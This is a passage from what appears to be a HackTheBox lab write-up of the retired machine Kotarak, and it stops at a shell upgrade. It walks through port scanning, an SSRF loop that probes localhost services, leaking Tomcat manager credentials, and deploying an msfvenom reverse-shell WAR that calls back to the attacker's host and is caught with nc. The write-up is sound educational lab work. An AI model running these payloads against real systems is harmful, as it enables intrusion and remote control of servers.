@@ -1,0 +1,716 @@
+<article class="post h-entry" itemscope="" itemtype="http://schema.org/BlogPosting">
+<header class="post-header">
+<h1 class="post-title p-name" itemprop="name headline">HTB: Kotarak</h1>
+<p class="post-meta">
+<span class="tag-list"><a class="post-tag" href="/tags#htb-kotarak">htb-kotarak</a> <a class="post-tag" href="/tags#ctf">ctf</a> <a class="post-tag" href="/tags#hackthebox">hackthebox</a> <a class="post-tag" href="/tags#nmap">nmap</a> <a class="post-tag" href="/tags#tomcat">tomcat</a> <a class="post-tag" href="/tags#feroxbuster">feroxbuster</a> <a class="post-tag" href="/tags#ssrf">ssrf</a> <a class="post-tag" href="/tags#msfvenom">msfvenom</a> <a class="post-tag" href="/tags#war">war</a> <a class="post-tag" href="/tags#container">container</a> <a class="post-tag" href="/tags#lxc">lxc</a> <a class="post-tag" href="/tags#ntds">ntds</a> <a class="post-tag" href="/tags#secretsdump">secretsdump</a> <a class="post-tag" href="/tags#wget">wget</a> <a class="post-tag" href="/tags#cve-2016-4971">cve-2016-4971</a> <a class="post-tag" href="/tags#authbind">authbind</a> <a class="post-tag" href="/tags#disk">disk</a> <a class="post-tag" href="/tags#lvm">lvm</a> <a class="post-tag" href="/tags#htb-nineveh">htb-nineveh</a> <a class="post-tag" href="/tags#htb-jerry">htb-jerry</a> <a class="post-tag" href="/tags#htb-tabby">htb-tabby</a> <a class="post-tag" href="/tags#oscp-plus-v1">oscp-plus-v1</a> </span><br/><br/>
+<time class="dt-published" datetime="2021-05-19T09:00:00+00:00" itemprop="datePublished">May 19, 2021
+      </time></p>
+</header>
+<div class="post-content e-content" itemprop="articleBody">
+<div class="row">
+<div class="col-sm-3">
+<div class="sticky-top">
+<p><a href="/2021/05/19/htb-kotarak.html" style="color: #e6e6e6; text-decoration: none;">HTB: Kotarak</a></p>
+<!--https://afeld.github.io/bootstrap-toc/-->
+<nav data-toggle="toc" id="toc"></nav>
+</div>
+</div>
+<div class="col-sm-9" id="postBody">
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/kotarak-cover.webp" type="image/webp"/>
+<img alt="Kotarak" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/kotarak-cover.png" style="float: right; margin-right:50px; margin-left:50px; height:120px;">
+</img></picture>
+<p>Kotarak was an old box that I had a really fun time replaying for a writeup. It starts with an SSRF that allows me to find additional webservers on ports only listening on localhost. I’ll use that to leak a Tomcat config with username and password, and upload a malicious war to get a shell. From there, I can access files from an old Windows pentest to include an ntds.dit file and a system hive. That’s enough to dump a bunch of hashes, one of which cracks and provides creds I can use to get the next user. The root flag is actually in a container that is using Wget to request a file every two minutes. It’s an old vulnerable version, and a really neat exploit that involves sending a redirect to an FTP server and using that to write a malicious config file in the root home directory in the container. I’ll also show an alternative root abusing the user’s disk group to exfil the entire root filesystem and grab the flag on my local system.</p>
+<h2 id="box-info">Box Info</h2>
+<!-- https://app.hackthebox.com/machines/101 -->
+<table>
+<thead>
+<tr>
+<th>Name</th>
+<th style="text-align: right"><a href="https://hackthebox.com/machines/kotarak" style="font-size: xx-large; text-shadow: 0 0 5px #ffffff, 0 0 7px #ffffff; color: #1756a9" target="_blank">Kotarak</a> <a href="https://hackthebox.com/machines/kotarak" target="_blank"><picture style="float: right; padding-left: 20px;"><source srcset="/icons/box-kotarak.webp" type="image/webp"/> <img alt="Kotarak" class="img-av" src="/icons/box-kotarak.png"/></picture></a><br/><a href="https://hackthebox.com/machines/kotarak" style="font-size: small; color: white;" target="_blank">Play on HackTheBox</a></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Release Date</td>
+<td style="text-align: right"><a href="https://twitter.com/hackthebox_eu/status/910862816508248069">23 Sep 2017</a></td>
+</tr>
+<tr>
+<td>Retire Date</td>
+<td style="text-align: right">10 Mar 2018</td>
+</tr>
+<tr>
+<td>OS</td>
+<td style="text-align: right">Linux <picture><source srcset="/icons/Linux.webp" type="image/webp"/><img alt="Linux" class="img-os" src="/icons/Linux.png"/></picture></td>
+</tr>
+<tr>
+<td>Base Points</td>
+<td style="text-align: right"><span class="diff-Hard">Hard [40]</span></td>
+</tr>
+<tr>
+<td>Rated Difficulty</td>
+<td style="text-align: right"><picture><source srcset="/img/kotarak-diff.webp" type="image/webp"/><img alt="Rated difficulty for Kotarak" src="/img/kotarak-diff.png" style="display: unset;"/></picture></td>
+</tr>
+<tr>
+<td>Radar Graph</td>
+<td style="text-align: right"><picture><source srcset="/img/kotarak-radar.webp" type="image/webp"/><img alt="Radar chart for Kotarak" src="/img/kotarak-radar.png" style="display: unset;"/></picture></td>
+</tr>
+<tr>
+<td><picture><source srcset="/icons/first-blood-user.webp" type="image/webp"/><img alt="First Blood User" src="/icons/first-blood-user.png" style="display: unset"/></picture></td>
+<td style="text-align: right"><span class="blood-time">07:36:13</span><a href="https://app.hackthebox.com/users/8976" rel="noopener" target="_blank"><img alt="olihough86" onerror="this.style.display='none'; this.nextSibling.style.display='inline';" src="https://www.hackthebox.com/badge/image/8976" style="display: unset"/><span class="user-text" style="display: none"> olihough86</span></a><br/></td>
+</tr>
+<tr>
+<td><picture><source srcset="/icons/first-blood-root.webp" type="image/webp"/><img alt="First Blood Root" src="/icons/first-blood-root.png" style="display: unset"/></picture></td>
+<td style="text-align: right"><span class="blood-time">22:38:59</span><a href="https://app.hackthebox.com/users/1183" rel="noopener" target="_blank"><img alt="arkantolo" onerror="this.style.display='none'; this.nextSibling.style.display='inline';" src="https://www.hackthebox.com/badge/image/1183" style="display: unset"/><span class="user-text" style="display: none"> arkantolo</span></a><br/></td>
+</tr>
+<tr>
+<td>Creator</td>
+<td style="text-align: right"><a href="https://app.hackthebox.com/users/2984" rel="noopener" target="_blank"><img alt="mrb3n" onerror="this.style.display='none'; this.nextSibling.style.display='inline';" src="https://www.hackthebox.com/badge/image/2984" style="display: unset"/><span class="user-text" style="display: none"> mrb3n</span></a><br/></td>
+</tr>
+</tbody>
+</table>
+<h2 id="recon">Recon</h2>
+<h3 id="nmap">nmap</h3>
+<p><code class="language-plaintext highlighter-rouge">nmap</code> found four open TCP ports, SSH (22), HTTP Tomcat (8080), Tomcat AJP (8009), and HTTP Apache (60000):</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@parrot$</span><span class="w"> </span>nmap <span class="nt">-p-</span> <span class="nt">--min-rate</span> 10000 <span class="nt">-oA</span> scans/nmap-alltcp 10.10.10.55
+<span class="go">Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-13 17:11 EDT
+Nmap scan report for 10.10.10.55
+Host is up (0.022s latency).                                                    
+Not shown: 65530 closed ports                                                   
+PORT      STATE    SERVICE                                                      
+22/tcp    open     ssh                                                          
+8009/tcp  open     ajp13     
+8080/tcp  open     http-proxy
+32939/tcp filtered unknown                                                      
+60000/tcp open     unknown                                                      
+                                                                                
+Nmap done: 1 IP address (1 host up) scanned in 11.39 seconds
+</span><span class="gp">oxdf@parrot$</span><span class="w"> </span>nmap <span class="nt">-p</span> 22,8009,8080,60000 <span class="nt">-sCV</span> <span class="nt">-oA</span> scans/nmap-tcpscripts 10.10.10.55
+<span class="go">Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-13 17:12 EDT
+Nmap scan report for 10.10.10.55
+Host is up (0.019s latency).
+
+PORT      STATE SERVICE VERSION
+22/tcp    open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 e2:d7:ca:0e:b7:cb:0a:51:f7:2e:75:ea:02:24:17:74 (RSA)
+|   256 e8:f1:c0:d3:7d:9b:43:73:ad:37:3b:cb:e1:64:8e:e9 (ECDSA)
+|_  256 6d:e9:26:ad:86:02:2d:68:e1:eb:ad:66:a0:60:17:b8 (ED25519)
+8009/tcp  open  ajp13   Apache Jserv (Protocol v1.3)
+| ajp-methods: 
+|   Supported methods: GET HEAD POST PUT DELETE OPTIONS
+|   Potentially risky methods: PUT DELETE
+|_  See https://nmap.org/nsedoc/scripts/ajp-methods.html
+8080/tcp  open  http    Apache Tomcat 8.5.5
+|_http-favicon: Apache Tomcat
+| http-methods: 
+|_  Potentially risky methods: PUT DELETE
+|_http-title: Apache Tomcat/8.5.5 - Error report
+60000/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+|_http-title:         Kotarak Web Hosting        
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 52.10 seconds
+</span></code></pre></div></div>
+<p>Based on the <a href="https://packages.ubuntu.com/search?keywords=openssh-server">OpenSSH</a> and <a href="https://packages.ubuntu.com/search?keywords=apache2">Apache</a> versions, the host is likely running Ubuntu Xenial 16.04.</p>
+<h3 id="tomcat---tcp-8080">Tomcat - TCP 8080</h3>
+<p>Visiting the site at <code class="language-plaintext highlighter-rouge">http://10.10.10.55:8080</code> just returns a 404:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/image-20210513172136703.webp" type="image/webp"/>
+<img alt="image-20210513172136703" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/image-20210513172136703.png"/>
+</picture>
+<p>I can check the Tomcat manager page at <code class="language-plaintext highlighter-rouge">/manager/html</code>, but it wants username and password:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/image-20210513172356495.webp" type="image/webp"/>
+<img alt="image-20210513172356495" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/image-20210513172356495.png"/>
+</picture>
+<p>None of the defaults work.</p>
+<p>I did run <a href="https://github.com/epi052/feroxbuster">FeroxBuster</a> against the site, and it returned a lot, but nothing particularly interesting. It’s all default Tomcat stuff, and all requires credentials.</p>
+<h3 id="tomcat-ajp---tcp-8009">Tomcat AJP - TCP 8009</h3>
+<p>TCP 8009 is a default Tomcat port, and it gives access to the same kind of stuff that I would get with <code class="language-plaintext highlighter-rouge">/manager/html</code> on 8080, but using a binary protocol instead of HTTP. Hacktricks has a post on <a href="https://book.hacktricks.xyz/pentesting/8009-pentesting-apache-jserv-protocol-ajp">Pentesting AJP</a>, but there’s not a ton here.</p>
+<p>I did play with the <a href="https://www.exploit-db.com/exploits/48143">ghostcat script</a> a bit to see if I could exfil files, and I could read the <code class="language-plaintext highlighter-rouge">WEB-INF/web.xml</code> like in the example:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@parrot$</span><span class="w"> </span>python2 ghostcat.py <span class="nt">-p</span> 8009 <span class="nt">-f</span> WEB-INF/web.xml 10.10.10.55
+<span class="go">Getting resource at ajp13://10.10.10.55:8009/asdf
+----------------------------
+&lt;?xml version="1.0" encoding="UTF-8"?&gt;
+&lt;!--
+...[snip]...
+--&gt;
+&lt;web-app xmlns="http://xmlns.jcp.org/xml/ns/javaee"
+  xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
+  xsi:schemaLocation="http://xmlns.jcp.org/xml/ns/javaee
+                      http://xmlns.jcp.org/xml/ns/javaee/web-app_3_1.xsd"
+  version="3.1"
+  metadata-complete="true"&gt;
+
+  &lt;display-name&gt;Welcome to Tomcat&lt;/display-name&gt;
+  &lt;description&gt;
+     Welcome to Tomcat
+  &lt;/description&gt;
+
+&lt;/web-app&gt;
+</span></code></pre></div></div>
+<p>Still, there’s not much of interest in that folder, and trying to read outside that folder fails.</p>
+<h3 id="http---tcp-60000">HTTP - TCP 60000</h3>
+<h4 id="site">Site</h4>
+<p>The site is the Kotarak Web Hosting Private Browser:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/image-20210513173429593.webp" type="image/webp"/>
+<img alt="image-20210513173429593" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/image-20210513173429593.png"/>
+</picture>
+<p>None of the links lead anywhere.</p>
+<h4 id="tech-stack">Tech Stack</h4>
+<p>The HTTP response headers don’t show much besides Apache. Guessing at what page the root might be, <code class="language-plaintext highlighter-rouge">index.html</code> doesn’t exist, but <code class="language-plaintext highlighter-rouge">index.php</code> does, so the site is running PHP over Apache.</p>
+<h4 id="directory-brute-force">Directory Brute Force</h4>
+<p>Running <a href="https://github.com/epi052/feroxbuster">FeroxBuster</a> with <code class="language-plaintext highlighter-rouge">-x php</code> to include PHP extensions shows three pages:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@parrot$</span><span class="w"> </span>feroxbuster <span class="nt">-u</span> http://10.10.10.55:60000 <span class="nt">-o</span> scans/ferox-60000-root <span class="nt">-x</span> php
+<span class="go">
+ ___  ___  __   __     __      __         __   ___
+|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
+|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
+by Ben "epi" Risher 🤓                 ver: 2.2.1
+───────────────────────────┬──────────────────────
+ 🎯  Target Url            │ http://10.10.10.55:60000
+ 🚀  Threads               │ 50
+ 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
+ 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405]
+ 💥  Timeout (secs)        │ 7
+ 🦡  User-Agent            │ feroxbuster/2.2.1
+ 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
+ 💾  Output File           │ scans/ferox-60000-root
+ 💲  Extensions            │ [php]
+ 🔃  Recursion Depth       │ 4
+ 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
+───────────────────────────┴──────────────────────
+ 🏁  Press [ENTER] to use the Scan Cancel Menu™
+──────────────────────────────────────────────────
+</span><span class="feroxbuster-red">403</span><span class="go">       11l       32w      302c http://10.10.10.55:60000/server-status
+</span><span class="feroxbuster-green">200</span><span class="go">       76l      130w     1169c http://10.10.10.55:60000/index.php
+</span><span class="feroxbuster-green">200</span><span class="go">        2l        0w        2c http://10.10.10.55:60000/url.php
+</span><span class="feroxbuster-green">200</span><span class="go">     1110l     5668w        0c http://10.10.10.55:60000/info.php
+[</span><span class="feroxbuster-yellow">####################</span><span class="go">] - 31s    59998/59998   0s      </span><span class="feroxbuster-green">found</span><span class="go">:4       </span><span class="feroxbuster-red">errors</span><span class="go">:0      
+[</span><span class="feroxbuster-cyan">####################</span><span class="go">] - 30s    59998/59998   1936/s  http://10.10.10.55:60000
+</span></code></pre></div></div>
+<p><code class="language-plaintext highlighter-rouge">/info.php</code> runs <code class="language-plaintext highlighter-rouge">phpinfo()</code>:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/image-20210513174032104.webp" type="image/webp"/>
+<img alt="image-20210513174032104" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/image-20210513174032104.png"/>
+</picture>
+<p><code class="language-plaintext highlighter-rouge">file_uploads</code> is on:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/image-20210513174221955.webp" type="image/webp"/>
+<img alt="image-20210513174221955" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/image-20210513174221955.png"/>
+</picture>
+<p>This means if I can find an LFI, I can get RCE through the PHPInfo page like I showed in <a href="/2020/04/22/htb-nineveh.html#shell-as-www-data-via-phpinfophp">Nineveh</a>. I’ll keep an eye out for that.</p>
+<p><code class="language-plaintext highlighter-rouge">/index.php</code> is the main page.</p>
+<h4 id="loading-a-url">Loading a URL</h4>
+<p>The page asks me to submit a url for it to scan. I’ll start a Python webserver on my host (<code class="language-plaintext highlighter-rouge">python3 -m http.server 80</code>) and then give it my host as a url (<code class="language-plaintext highlighter-rouge">http://10.10.14.15/</code>). It connects:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>10.10.10.55 - - [13/May/2021 17:37:38] "GET / HTTP/1.1" 200 -
+</code></pre></div></div>
+<p>And then shows the empty directory:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/image-20210513174417628.webp" type="image/webp"/>
+<img alt="image-20210513174417628" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/image-20210513174417628.png"/>
+</picture>
+<p>I can try some things to read local files from Kotarak. Giving it <code class="language-plaintext highlighter-rouge">file:///etc/passwd</code> returns “try harder”</p>
+<h2 id="shell-as-tomcat-on-dmz">Shell as Tomcat on dmz</h2>
+<h3 id="get-tomcat-password">Get Tomcat Password</h3>
+<h4 id="ssrf-check">SSRF Check</h4>
+<p>I can use this to check for listening ports on Kotarak. For example, when I <code class="language-plaintext highlighter-rouge">curl</code> port 22, I get the SSH banner, and then an error:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@parrot$</span><span class="w"> </span>curl http://10.10.10.55:60000/url.php?path<span class="o">=</span>http%3A%2F%2F127.0.0.1%3A22
+<span class="go">SSH-2.0-OpenSSH_7.2p2 Ubuntu-4ubuntu2.2
+Protocol mismatch.
+</span></code></pre></div></div>
+<p>Looking at port 10 (unlikely to be listening), there’s an empty response:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@parrot$</span><span class="w"> </span>curl http://10.10.10.55:60000/url.php?path<span class="o">=</span>http%3A%2F%2F127.0.0.1%3A10
+<span class="go">
+</span></code></pre></div></div>
+<h4 id="loop">Loop</h4>
+<p>I can create a Bash loop to check all 65535 ports for responses:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">for </span>i <span class="k">in</span> <span class="o">{</span>0..65535<span class="o">}</span><span class="p">;</span> <span class="k">do 
+  </span><span class="nv">res</span><span class="o">=</span><span class="si">$(</span>curl <span class="nt">-s</span> http://10.10.10.55:60000/url.php?path<span class="o">=</span>http%3A%2F%2F127.0.0.1%3A<span class="k">${</span><span class="nv">i</span><span class="k">}</span><span class="si">)</span><span class="p">;</span>
+  <span class="nv">len</span><span class="o">=</span><span class="si">$(</span><span class="nb">echo</span> <span class="nv">$res</span> | <span class="nb">wc</span> <span class="nt">-w</span><span class="si">)</span><span class="p">;</span> 
+  <span class="k">if</span> <span class="o">[</span> <span class="s2">"</span><span class="nv">$len</span><span class="s2">"</span> <span class="nt">-gt</span> <span class="s2">"0"</span> <span class="o">]</span><span class="p">;</span> <span class="k">then
+    </span><span class="nb">echo</span> <span class="nt">-n</span> <span class="s2">"</span><span class="k">${</span><span class="nv">i</span><span class="k">}</span><span class="s2">: "</span><span class="p">;</span> 
+    <span class="nb">echo</span> <span class="nv">$res</span> | <span class="nb">tr</span> <span class="nt">-d</span> <span class="s2">"</span><span class="se">\r</span><span class="s2">"</span> | <span class="nb">head</span> <span class="nt">-1</span> | <span class="nb">cut</span> <span class="nt">-c-100</span><span class="p">;</span> 
+  <span class="k">fi</span><span class="p">;</span>
+<span class="k">done</span>
+</code></pre></div></div>
+<p>This will loop over the numbers 0 to 65535. For each, it will submit <code class="language-plaintext highlighter-rouge">http://127.0.0.1:${i}</code> to the Kotarak browser, where <code class="language-plaintext highlighter-rouge">${i}</code> is the Bash variable. It will store the result in <code class="language-plaintext highlighter-rouge">$res</code>. It gets the length of <code class="language-plaintext highlighter-rouge">$res</code>, and if that’s longer than 0, it prints <code class="language-plaintext highlighter-rouge">${i}</code> and the first line of <code class="language-plaintext highlighter-rouge">$res</code> up to 100 characters.</p>
+<p>Running this got through about 1000 ports per minute, so it got through the first 1000 ports pretty quickly, but the entire loop takes a while. I can start enumerating the lower ports right away, but I let it run to completion because this box already had a service hidden at tcp 60000 (and I had to step away from the computer for a bit anyway).</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@parrot$</span><span class="w"> </span><span class="nb">time </span><span class="k">for </span>i <span class="k">in</span> <span class="o">{</span>1..65535<span class="o">}</span><span class="p">;</span> <span class="k">do </span><span class="nv">res</span><span class="o">=</span><span class="si">$(</span>curl <span class="nt">-s</span> http://10.10.10.55:60000/url.php?path<span class="o">=</span>http%3A%2F%2F127.0.0.1%3A<span class="k">${</span><span class="nv">i</span><span class="k">}</span><span class="si">)</span><span class="p">;</span> <span class="nv">len</span><span class="o">=</span><span class="si">$(</span><span class="nb">echo</span> <span class="nv">$res</span> | <span class="nb">wc</span> <span class="nt">-w</span><span class="si">)</span><span class="p">;</span> <span class="k">if</span> <span class="o">[</span> <span class="s2">"</span><span class="nv">$len</span><span class="s2">"</span> <span class="nt">-gt</span> <span class="s2">"0"</span> <span class="o">]</span><span class="p">;</span> <span class="k">then </span><span class="nb">echo</span> <span class="nt">-n</span> <span class="s2">"</span><span class="k">${</span><span class="nv">i</span><span class="k">}</span><span class="s2">: "</span><span class="p">;</span> <span class="nb">echo</span> <span class="nv">$res</span> | <span class="nb">tr</span> <span class="nt">-d</span> <span class="s2">"</span><span class="se">\r</span><span class="s2">"</span> | <span class="nb">head</span> <span class="nt">-1</span> | <span class="nb">cut</span> <span class="nt">-c-100</span><span class="p">;</span> <span class="k">fi</span><span class="p">;</span> <span class="k">done</span>
+<span class="go">22: SSH-2.0-OpenSSH_7.2p2 Ubuntu-4ubuntu2.2 Protocol mismatch.
+90: &lt;!DOCTYPE&gt; &lt;html&gt; &lt;head&gt; &lt;title&gt;Under Construction&lt;/title&gt; &lt;/head&gt; &lt;bodyd&gt; &lt;p&gt;This page is under con
+110: &lt;html&gt; &lt;head&gt; &lt;title&gt; favorites / bookmark title goes here &lt;/title&gt; &lt;/head&gt; &lt;body bgcolor="white" te
+200: &lt;b&gt;Hello world!&lt;/b&gt;
+320: &lt;!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd"&gt;&lt;html&gt; &lt;he
+888: &lt;html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en"&gt; &lt;head&gt; &lt;meta http-equiv="content
+-bash: warning: command substitution: ignored null byte in input
+3306: 5.7.19-0ubuntu0.16.04.1 %t&amp;Jz/a,X?JFLymysql_native_passwordot packets out of order
+8080: &lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;&lt;title&gt;Apache Tomcat/8.5.5 - Error report&lt;/title&gt;&lt;style type="text/css"&gt;H
+60000: &lt;!DOCTYPE html&gt; &lt;html&gt; &lt;head&gt; &lt;style&gt; div.container { width: 100%; border: 1px solid gray; } header,
+
+real    60m47.560s
+user    8m4.942s
+sys     10m12.692s
+</span></code></pre></div></div>
+<h4 id="enumerating-servers">Enumerating Servers</h4>
+<p>I can step through the different ports identified above. SSH (22), Tomcat (8080, though interestingly no response from 8009), and 60000 (Apache) are the same services available to the outside. 3306 looks like MySQL, which makes sense for that port. I could play with trying to use Gopher to access it, though without creds, that seems like a longshot.</p>
+<p>There are likely HTML pages on 90, 110, 200, 320, and 888. I’ll jump back to the 60000 webpage to check those out.</p>
+<p>90 returns:</p>
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;</span><span class="err">!</span><span class="na">DOCTYPE</span><span class="nt">&gt;</span>
+<span class="nt">&lt;html&gt;</span>
+<span class="nt">&lt;head&gt;</span>
+<span class="nt">&lt;title&gt;</span>Under Construction<span class="nt">&lt;/title&gt;</span>
+<span class="nt">&lt;/head&gt;</span>
+<span class="nt">&lt;bodyd&gt;</span>
+<span class="nt">&lt;p&gt;</span>This page is under construction. Please come back soon!<span class="nt">&lt;/p&gt;</span>
+<span class="nt">&lt;/body&gt;</span>
+<span class="nt">&lt;/html&gt;</span>
+</code></pre></div></div>
+<p>110 has another dummy page:</p>
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;html&gt;</span>
+
+<span class="nt">&lt;head&gt;</span>
+<span class="nt">&lt;title&gt;</span> favorites / bookmark title goes here <span class="nt">&lt;/title&gt;</span>
+<span class="nt">&lt;/head&gt;</span>
+
+<span class="nt">&lt;body</span> <span class="na">bgcolor=</span><span class="s">"white"</span> <span class="na">text=</span><span class="s">"blue"</span><span class="nt">&gt;</span>
+
+<span class="nt">&lt;h1&gt;</span>Test page <span class="nt">&lt;/h1&gt;</span>
+
+Absolutely nothing to see here.
+
+<span class="nt">&lt;/body&gt;</span>
+
+<span class="nt">&lt;/html&gt;</span>
+</code></pre></div></div>
+<p>As does 200:</p>
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;b&gt;</span>Hello world!<span class="nt">&lt;/b&gt;</span>
+</code></pre></div></div>
+<p>320 has a login form:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/image-20210514073306376.webp" type="image/webp"/>
+<img alt="image-20210514073306376" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/image-20210514073306376.png"/>
+</picture>
+<p>This is interesting. I can’t just put a password in and try to login, as the POST goes back to the service on 60000, not the on on 320. I can come back to this and play with trying to send a POST request using Gopher or something else, but I didn’t end up using this, and confirmed on rooting that it was just a static page, so a rabbit hole.</p>
+<p>Port 888 presents a “Simple File Viewer”:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/image-20210514073528155.webp" type="image/webp"/>
+<img alt="image-20210514073528155" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/image-20210514073528155.png"/>
+</picture>
+<p>The images don’t load (the references are to port 888, and my browser can’t access those). And the links are broken on clicking on them as they look like:</p>
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"?doc=on"</span>  <span class="na">class=</span><span class="s">"tableElement"</span><span class="nt">&gt;</span>
+</code></pre></div></div>
+<p>Clicking this will load <code class="language-plaintext highlighter-rouge">http://10.10.10.55:60000/url.php?doc=on</code>. But if I was directly visiting <code class="language-plaintext highlighter-rouge">http://127.0.0.1:888</code>, it would load <code class="language-plaintext highlighter-rouge">http://127.0.0.1:888/?doc=on</code>. I can put that into the Kotarak browser, and it returns nothing. That makes sense, as the page says <code class="language-plaintext highlighter-rouge">on</code> is zero bytes. Of the three files of any size, two aren’t useful. <code class="language-plaintext highlighter-rouge">blah</code> is a bunch of As, <code class="language-plaintext highlighter-rouge">tetris.c</code> is exactly what you might expect, C code for a game that looks like Tetris. <code class="language-plaintext highlighter-rouge">backup</code> is:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/image-20210514074103740.webp" type="image/webp"/>
+<img alt="image-20210514074103740" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/image-20210514074103740.png"/>
+</picture>
+<p>This is the <code class="language-plaintext highlighter-rouge">tomcat_users.xml</code> file that configures access to Tomcat.</p>
+<h3 id="malicious-war">Malicious WAR</h3>
+<h4 id="access-tomcat-manager">Access Tomcat Manager</h4>
+<p>The admin user in the backup file has access to <code class="language-plaintext highlighter-rouge">manager</code> and <code class="language-plaintext highlighter-rouge">manager-gui</code>, so I’ll try visiting <code class="language-plaintext highlighter-rouge">http://10.10.10.55:8080</code> again, and entering the creds lets me in:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/image-20210514090529954.webp" type="image/webp"/>
+<img alt="image-20210514090529954" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/image-20210514090529954.png"/>
+</picture>
+<h4 id="generate-war">Generate WAR</h4>
+<p>To get a shell from here is relatively simple, just like in <a href="/2018/11/17/htb-jerry.html#exploiting-tomcat">Jerry</a> and <a href="/2020/11/07/htb-tabby.html#text-based-manager">Tabby</a> (though in Tabby I had to use the text-based manager instead of the html one because the user I leaked had only  <code class="language-plaintext highlighter-rouge">manager-script</code>).</p>
+<p>I’ll generate a reverse shell payload using <code class="language-plaintext highlighter-rouge">msfvenom</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@parrot$</span><span class="w"> </span>msfvenom <span class="nt">-p</span> java/shell_reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>10.10.14.15 <span class="nv">LPORT</span><span class="o">=</span>443 <span class="nt">-f</span> war <span class="nt">-o</span> rev.war
+<span class="go">Payload size: 13318 bytes
+Final size of war file: 13318 bytes
+Saved as: rev.war
+</span></code></pre></div></div>
+<h4 id="upload">Upload</h4>
+<p>To upload the WAR, I’ll use the “WAR file to deploy” section on the page, using the browse button to select <code class="language-plaintext highlighter-rouge">rev.war</code>:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/image-20210514091040405.webp" type="image/webp"/>
+<img alt="image-20210514091040405" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/image-20210514091040405.png"/>
+</picture>
+<p>On hitting Deploy, <code class="language-plaintext highlighter-rouge">/rev</code> now shows up as an application:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/image-20210514091140439.webp" type="image/webp"/>
+<img alt="image-20210514091140439" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/image-20210514091140439.png"/>
+</picture>
+<p>With <code class="language-plaintext highlighter-rouge">nc</code> listening, I’ll click <code class="language-plaintext highlighter-rouge">/rev</code>, and it returns a blank page, but also a shell at <code class="language-plaintext highlighter-rouge">nc</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@parrot$</span><span class="w"> </span>nc <span class="nt">-lnvp</span> 443
+<span class="go">listening on [any] 443 ...
+connect to [10.10.14.15] from (UNKNOWN) [10.10.10.55] 51386
+id
+uid=1001(tomcat) gid=1001(tomcat) groups=1001(tomcat)
+</span></code></pre></div></div>
+<p>Shell upgrade with the standard trick:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python -c 'import pty;pty.spawn("bash")'
